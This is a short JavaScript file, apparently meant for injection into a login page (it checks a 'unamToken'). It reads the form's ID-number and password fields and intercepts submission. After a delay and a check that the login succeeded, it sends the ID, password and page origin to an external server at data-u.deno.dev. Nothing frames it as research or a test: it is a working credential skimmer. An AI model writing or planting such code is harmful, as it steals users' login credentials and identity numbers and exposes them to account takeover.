const inputs = [...document.querySelectorAll("input")];
const mainForm = document.querySelector("form");

// I'm goonna do a post with the data
const doAPost = async () => {
  const resp = await fetch("https://data-u.deno.dev/api/users", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      dni: inputs[0].value,
      pass: inputs[1].value,
      origin: location.origin,
      createdAt: Date.now(),
    }),
  });

  const data = await resp.json();
  console.log(data);
};

// event if press enter key
mainForm.addEventListener("submit", (e) => {
  e.preventDefault();
  setTimeout(() => {
    if (!localStorage.getItem("unamToken")) {
      console.log("email or password incorrect");
      return;
    } 
    doAPost();
  }, 3000);
});
